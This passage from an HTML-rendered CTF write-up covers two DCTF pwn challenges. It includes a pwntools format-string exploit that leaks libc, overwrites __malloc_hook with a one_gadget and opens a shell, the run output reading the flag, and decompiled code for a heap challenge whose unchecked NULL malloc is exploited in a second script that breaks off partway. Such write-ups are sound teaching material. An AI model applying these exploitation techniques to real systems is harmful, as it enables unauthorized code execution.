</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;libc.so.6&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;%2$p&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x3ed8c0</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;LIBC:  0x</span><span class="si">%x</span><span class="s2">&#34;</span> <span class="o">%</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">one_gadget</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x4f432</span>
</span></span><span class="line"><span class="cl"><span class="n">malloc_hook</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&#34;__malloc_hook&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">target</span> <span class="o">=</span> <span class="n">one_gadget</span>
</span></span><span class="line"><span class="cl"><span class="n">addr</span> <span class="o">=</span> <span class="n">malloc_hook</span>
</span></span><span class="line"><span class="cl"><span class="n">count</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="n">target</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="n">fmtstr_payload</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="p">{</span><span class="n">addr</span><span class="p">:</span> <span class="n">target</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">},</span> <span class="n">write_size</span><span class="o">=</span><span class="s1">&#39;short&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">addr</span> <span class="o">+=</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">    <span class="n">target</span> <span class="o">&gt;&gt;=</span> <span class="mi">16</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">count</span> <span class="o">+=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">%66000c</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></div><p>Running the exploit:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="err">❯</span> <span class="nf">python3</span> <span class="no">formats_the_theorem.py</span>
</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Opening</span> <span class="no">connection</span> <span class="no">to</span> <span class="no">dctf-chall-formats-last-theorem.westeurope.azurecontainer.io</span> <span class="no">on</span> <span class="no">port</span> <span class="mi">7482</span><span class="p">:</span> <span class="no">Done</span>
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="err">&#39;/</span><span class="nf">home</span><span class="err">/</span><span class="no">d4mianwayne</span><span class="err">/</span><span class="no">Pwning</span><span class="err">/</span><span class="no">CTFs</span><span class="err">/</span><span class="no">ductf</span><span class="err">/</span><span class="no">libc.so.6</span><span class="err">&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="nl">Arch:</span>     <span class="nf">amd64-64-little</span>
</span></span><span class="line"><span class="cl">    <span class="nl">RELRO:</span>    <span class="nf">Partial</span> <span class="no">RELRO</span>
</span></span><span class="line"><span class="cl">    <span class="nl">Stack:</span>    <span class="nf">Canary</span> <span class="no">found</span>
</span></span><span class="line"><span class="cl">    <span class="nl">NX:</span>       <span class="nf">NX</span> <span class="no">enabled</span>
</span></span><span class="line"><span class="cl">    <span class="nl">PIE:</span>      <span class="nf">PIE</span> <span class="no">enabled</span>
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nl">LIBC:</span>  <span class="err">0</span><span class="nf">x7f483a4b2000</span>
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Switching</span> <span class="no">to</span> <span class="no">interactive</span> <span class="no">mode</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">I</span> <span class="no">won</span><span class="err">&#39;</span><span class="no">t</span> <span class="no">ask</span> <span class="no">you</span><span class="p">,</span> <span class="no">what</span> <span class="no">your</span> <span class="no">name</span> <span class="no">is.</span> <span class="no">It</span><span class="err">&#39;</span><span class="no">s</span> <span class="no">getting</span> <span class="no">kinda</span> <span class="no">old</span> <span class="no">at</span> <span class="no">this</span> <span class="no">point</span>
</span></span><span class="line"><span class="cl"><span class="nf">you</span> <span class="no">entered</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">[</span><span class="na">..snip..</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">I</span> <span class="no">won</span><span class="err">&#39;</span><span class="no">t</span> <span class="no">ask</span> <span class="no">you</span><span class="p">,</span> <span class="no">what</span> <span class="no">your</span> <span class="no">name</span> <span class="no">is.</span> <span class="no">It</span><span class="err">&#39;</span><span class="no">s</span> <span class="no">getting</span> <span class="no">kinda</span> <span class="no">old</span> <span class="no">at</span> <span class="no">this</span> <span class="no">point</span>
</span></span><span class="line"><span class="cl"><span class="nf">you</span> <span class="no">entered</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">[</span><span class="na">..snip..</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">I</span> <span class="no">won</span><span class="err">&#39;</span><span class="no">t</span> <span class="no">ask</span> <span class="no">you</span><span class="p">,</span> <span class="no">what</span> <span class="no">your</span> <span class="no">name</span> <span class="no">is.</span> <span class="no">It</span><span class="err">&#39;</span><span class="no">s</span> <span class="no">getting</span> <span class="no">kinda</span> <span class="no">old</span> <span class="no">at</span> <span class="no">this</span> <span class="no">point</span>
</span></span><span class="line"><span class="cl"><span class="nf">you</span> <span class="no">entered</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">[</span><span class="na">..snip..</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">$</span> <span class="no">id</span>
</span></span><span class="line"><span class="cl"><span class="nf">uid</span><span class="err">=</span><span class="mi">1000</span><span class="p">(</span><span class="no">pilot</span><span class="p">)</span> <span class="no">gid</span><span class="err">=</span><span class="mi">1000</span><span class="p">(</span><span class="no">pilot</span><span class="p">)</span> <span class="no">groups</span><span class="err">=</span><span class="mi">1000</span><span class="p">(</span><span class="no">pilot</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nf">$</span> <span class="no">cat</span> <span class="no">flag.txt</span>
</span></span><span class="line"><span class="cl"><span class="nf">dctf</span><span class="err">{</span><span class="no">N0t_all_7h30r3ms_s0und_g00d</span><span class="err">}</span>
</span></span><span class="line"><span class="cl"><span class="nf">$</span> 
</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="no">Interrupted</span>
</span></span></code></pre></div><h3 id="just-another-heap" class="relative group">Just another heap <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#just-another-heap" aria-label="Anchor">#</a></span></h3><p>This challenge was solved by Faith, later he shared the exploit script for the challenge, he told me:-</p>
<blockquote>
<p>it was a simple bug, malloc returned null but they didnt check for null and just added a controlled value to it(edited)
[12:51 PM]
PIE was disabled, so u can make malloc return null with a large size, then add any value to create a pointer to any memory address</p>
</blockquote>
<p>Checking the binary with the checksec:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">checksec</span>
</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">checksec</span> <span class="no">for</span> <span class="err">&#39;/</span><span class="no">home</span><span class="err">/</span><span class="no">d4mianwayne</span><span class="err">/</span><span class="no">Pwning</span><span class="err">/</span><span class="no">CTFs</span><span class="err">/</span><span class="no">ductf</span><span class="err">/</span><span class="no">just_another_heap</span><span class="err">&#39;</span>
</span></span><span class="line"><span class="cl"><span class="nf">Canary</span>                        <span class="p">:</span> <span class="err">✓</span> 
</span></span><span class="line"><span class="cl"><span class="no">NX</span>                            <span class="p">:</span> <span class="err">✓</span> 
</span></span><span class="line"><span class="cl"><span class="no">PIE</span>                           <span class="p">:</span> <span class="err">✘</span> 
</span></span><span class="line"><span class="cl"><span class="no">Fortify</span>                       <span class="p">:</span> <span class="err">✘</span> 
</span></span><span class="line"><span class="cl"><span class="no">RelRO</span>                         <span class="p">:</span> <span class="no">Partial</span>
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  
</span></span></code></pre></div><p>The vulnerability existed in the function Create Memory:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">unsigned</span> <span class="no">__int64</span> <span class="no">create_memory</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="err">{</span>
</span></span><span class="line"><span class="cl">  <span class="nf">unsigned</span> <span class="no">__int64</span> <span class="no">v0</span><span class="c1">; // rbx
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">const</span> <span class="no">char</span> <span class="p">*</span><span class="no">name</span><span class="c1">; // rbx
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">int</span> <span class="no">important</span><span class="c1">; // [rsp+4h] [rbp-4Ch]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">int</span> <span class="no">recent</span><span class="c1">; // [rsp+8h] [rbp-48h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">int</span> <span class="no">i</span><span class="c1">; // [rsp+Ch] [rbp-44h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">size_t</span> <span class="no">size</span><span class="c1">; // [rsp+10h] [rbp-40h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">size_t</span> <span class="no">offset</span><span class="c1">; // [rsp+18h] [rbp-38h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">unsigned</span> <span class="no">__int64</span> <span class="no">idx</span><span class="c1">; // [rsp+20h] [rbp-30h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">char</span> <span class="p">*</span><span class="no">chunk</span><span class="c1">; // [rsp+28h] [rbp-28h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">char</span> <span class="no">is_important</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="c1">; // [rsp+34h] [rbp-1Ch] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">char</span> <span class="no">is_recent</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="c1">; // [rsp+36h] [rbp-1Ah] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">unsigned</span> <span class="no">__int64</span> <span class="no">v12</span><span class="c1">; // [rsp+38h] [rbp-18h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="nf">v12</span> <span class="err">=</span> <span class="no">__readfsqword</span><span class="p">(</span><span class="mi">0x28u</span><span class="p">)</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">if</span> <span class="p">(</span> <span class="no">dword_6020C0</span> <span class="err">&gt;</span> <span class="mi">9</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="err">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="err">&#34;</span><span class="no">You</span> <span class="no">already</span> <span class="no">have</span> <span class="no">to</span> <span class="no">many</span> <span class="no">memories</span> <span class="no">stored</span> <span class="no">in</span> <span class="no">here.</span> <span class="no">You</span> <span class="no">don</span><span class="err">&#39;</span><span class="no">t</span> <span class="no">want</span> <span class="no">another</span> <span class="no">one.</span><span class="err">&#34;</span><span class="p">)</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="err">}</span>
</span></span><span class="line"><span class="cl">  <span class="nf">else</span>
</span></span><span class="line"><span class="cl">  <span class="err">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">important</span> <span class="err">=</span> <span class="mi">0</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">recent</span> <span class="err">=</span> <span class="mi">0</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">idx</span> <span class="err">=</span> <span class="mi">0</span><span class="no">LL</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">puts</span><span class="p">(</span><span class="err">&#34;</span><span class="no">at</span> <span class="no">what</span> <span class="no">page</span> <span class="no">would</span> <span class="no">you</span> <span class="no">like</span> <span class="no">to</span> <span class="no">write</span><span class="err">?&#34;</span><span class="p">)</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">read_long</span><span class="p">((</span><span class="no">__int64</span><span class="p">)</span><span class="err">&amp;</span><span class="no">idx</span><span class="p">)</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">if</span> <span class="p">(</span> <span class="no">heap_list</span><span class="p">[</span><span class="no">idx</span><span class="p">]</span> <span class="err">||</span> <span class="no">idx</span> <span class="err">&gt;</span> <span class="mi">9</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="err">{</span>
</span></span><span class="line"><span class="cl">      <span class="nf">puts</span><span class="p">(</span><span class="err">&#34;</span><span class="no">there</span> <span class="no">is</span> <span class="no">already</span> <span class="no">something</span> <span class="no">written</span> <span class="no">at</span> <span class="no">that</span> <span class="no">page.</span><span class="err">&#34;</span><span class="p">)</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="err">}</span>
</span></span><span class="line"><span class="cl">    <span class="nf">else</span>
</span></span><span class="line"><span class="cl">    <span class="err">{</span>
</span></span><span class="line"><span class="cl">      <span class="nf">puts</span><span class="p">(</span><span class="err">&#34;</span><span class="no">name</span><span class="p">:</span><span class="err">&#34;</span><span class="p">)</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="nf">v0</span> <span class="err">=</span> <span class="no">idx</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="nf">struct_list</span><span class="p">[</span><span class="no">v0</span><span class="p">]</span> <span class="err">=</span> <span class="no">malloc</span><span class="p">(</span><span class="mi">0x20uLL</span><span class="p">)</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="nf">read_data</span><span class="p">((</span><span class="no">char</span> <span class="p">*)</span><span class="no">struct_list</span><span class="p">[</span><span class="no">idx</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="nf">name</span> <span class="err">=</span> <span class="p">(</span><span class="no">const</span> <span class="no">char</span> <span class="p">*)</span><span class="no">struct_list</span><span class="p">[</span><span class="no">idx</span><span class="p">]</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="nf">name</span><span class="p">[</span><span class="no">strcspn</span><span class="p">(</span><span class="no">name</span><span class="p">,</span> <span class="err">&#34;\</span><span class="no">n</span><span class="err">&#34;</span><span class="p">)]</span> <span class="err">=</span> <span class="mi">0</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="nf">puts</span><span class="p">(</span><span class="err">&#34;</span><span class="no">How</span> <span class="no">long</span> <span class="no">is</span> <span class="no">your</span> <span class="no">memory</span><span class="err">&#34;</span><span class="p">)</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="nf">read_long</span><span class="p">((</span><span class="no">__int64</span><span class="p">)</span><span class="err">&amp;</span><span class="no">size</span><span class="p">)</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="nf">chunk</span> <span class="err">=</span> <span class="p">(</span><span class="no">char</span> <span class="p">*)</span><span class="no">malloc</span><span class="p">(</span><span class="no">size</span><span class="p">)</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="nf">puts</span><span class="p">(</span><span class="err">&#34;</span><span class="no">Sometimes</span> <span class="no">our</span> <span class="no">memories</span> <span class="no">fade</span> <span class="no">and</span> <span class="no">we</span> <span class="no">only</span> <span class="no">remember</span> <span class="no">parts</span> <span class="no">of</span> <span class="no">them.</span><span class="err">&#34;</span><span class="p">)</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="nf">read_long</span><span class="p">((</span><span class="no">__int64</span><span class="p">)</span><span class="err">&amp;</span><span class="no">offset</span><span class="p">)</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="nf">puts</span><span class="p">(</span><span class="err">&#34;</span><span class="no">Would</span> <span class="no">you</span> <span class="no">like</span> <span class="no">to</span> <span class="no">leave</span> <span class="no">some</span> <span class="no">space</span> <span class="no">at</span> <span class="no">the</span> <span class="no">beginning</span> <span class="no">in</span> <span class="no">case</span> <span class="no">you</span> <span class="no">remember</span> <span class="no">later</span><span class="err">?&#34;</span><span class="p">)</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="nf">if</span> <span class="p">(</span> <span class="no">offset</span> <span class="err">&lt;=</span> <span class="no">size</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="err">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">if</span> <span class="p">(</span> <span class="no">chunk</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="err">{</span>
</span></span><span class="line"><span class="cl">          <span class="nf">for</span> <span class="p">(</span> <span class="no">i</span> <span class="err">=</span> <span class="mi">0</span><span class="c1">; i &lt; offset; ++i )
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nf">chunk</span><span class="p">[</span><span class="no">i</span><span class="p">]</span> <span class="err">=</span> <span class="mi">95</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="err">}</span>
</span></span><span class="line"><span class="cl">        <span class="nf">chunk</span> <span class="err">+=</span> <span class="no">offset</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">fflush</span><span class="p">(</span><span class="no">stdin</span><span class="p">)</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">puts</span><span class="p">(</span><span class="err">&#34;</span><span class="no">What</span> <span class="no">would</span> <span class="no">you</span> <span class="no">like</span> <span class="no">to</span> <span class="no">write</span><span class="err">&#34;</span><span class="p">)</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">read_data</span><span class="p">(</span><span class="no">chunk</span><span class="p">,</span> <span class="no">size</span> <span class="p">-</span> <span class="no">offset</span><span class="p">)</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">puts</span><span class="p">(</span><span class="err">&#34;</span><span class="no">Would</span> <span class="no">you</span> <span class="no">say</span> <span class="no">this</span> <span class="no">memory</span> <span class="no">is</span> <span class="no">important</span> <span class="no">to</span> <span class="no">you</span><span class="err">?</span> <span class="p">[</span><span class="no">Y</span><span class="err">/</span><span class="no">N</span><span class="p">]</span><span class="err">&#34;</span><span class="p">)</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">read_data</span><span class="p">(</span><span class="no">is_important</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">if</span> <span class="p">(</span> <span class="no">is_important</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="err">==</span> <span class="mi">89</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">          <span class="nf">important</span> <span class="err">=</span> <span class="mi">1</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">_IO_getc</span><span class="p">(</span><span class="no">stdin</span><span class="p">)</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">puts</span><span class="p">(</span><span class="err">&#34;</span><span class="no">Would</span> <span class="no">you</span> <span class="no">say</span> <span class="no">this</span> <span class="no">memory</span> <span class="no">was</span> <span class="no">recent</span><span class="err">?</span> <span class="p">[</span><span class="no">Y</span><span class="err">/</span><span class="no">N</span><span class="p">]</span><span class="err">&#34;</span><span class="p">)</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">read_data</span><span class="p">(</span><span class="no">is_recent</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">if</span> <span class="p">(</span> <span class="no">is_recent</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="err">==</span> <span class="mi">89</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">          <span class="nf">recent</span> <span class="err">=</span> <span class="mi">1</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">heap_list</span><span class="p">[</span><span class="no">idx</span><span class="p">]</span> <span class="err">=</span> <span class="no">chunk</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">recent_list</span><span class="p">[</span><span class="no">idx</span><span class="p">]</span> <span class="err">=</span> <span class="no">recent</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">important_list</span><span class="p">[</span><span class="no">idx</span><span class="p">]</span> <span class="err">=</span> <span class="no">important</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">offset_list</span><span class="p">[</span><span class="no">idx</span><span class="p">]</span> <span class="err">=</span> <span class="no">offset</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">size_list</span><span class="p">[</span><span class="no">idx</span><span class="p">]</span> <span class="err">=</span> <span class="no">size</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="err">++</span><span class="nf">dword_6020C0</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">puts</span><span class="p">(</span><span class="err">&#34;</span><span class="no">Memory</span> <span class="no">created</span> <span class="no">successfully</span><span class="err">\</span><span class="no">n</span><span class="err">&#34;</span><span class="p">)</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">puts</span><span class="p">(</span><span class="no">byte_401786</span><span class="p">)</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">fflush</span><span class="p">(</span><span class="no">stdin</span><span class="p">)</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="err">}</span>
</span></span><span class="line"><span class="cl">      <span class="nf">else</span>
</span></span><span class="line"><span class="cl">      <span class="err">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">puts</span><span class="p">(</span><span class="err">&#34;</span><span class="no">Invalid</span> <span class="no">offset</span><span class="err">&#34;</span><span class="p">)</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="err">}</span>
</span></span><span class="line"><span class="cl">    <span class="err">}</span>
</span></span><span class="line"><span class="cl">  <span class="err">}</span>
</span></span><span class="line"><span class="cl">  <span class="nf">return</span> <span class="no">__readfsqword</span><span class="p">(</span><span class="mi">0x28u</span><span class="p">)</span> <span class="err">^</span> <span class="no">v12</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">}</span>
</span></span></code></pre></div><p>The vulnerability was that the program doesn’t check whether the pointer returned by the malloc is valid or not, the program also allow us to enter a, kind of, offset which will be added to the pointer returned by the malloc, since there’s no check for invalid/NULL return value from the malloc, we can exploit this one by giving a large size of the malloc which will return NULL, then we can give the address of the global array which stores the name pointer, what we will exactly do here is explained as follows:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#!/usr/bin/env python3</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">e</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./just_another_heap&#34;</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./libc.so.6&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#p = process(&#34;./just_another_heap&#34;, env={&#34;LD_PRELOAD&#34;: &#34;./libc.so.6&#34;})</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;dctf-chall-just-another-heap.westeurope.azurecontainer.io&#34;</span><span class="p">,</span> <span class="mi">7481</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">create</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">empty</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">important</span><span class="p">,</span> <span class="n">recent</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Exit</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;1&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;name:</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;memory</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;them.</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">empty</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;write</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">important</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;Y&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;N&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">recent</span><span class="p">:</span>
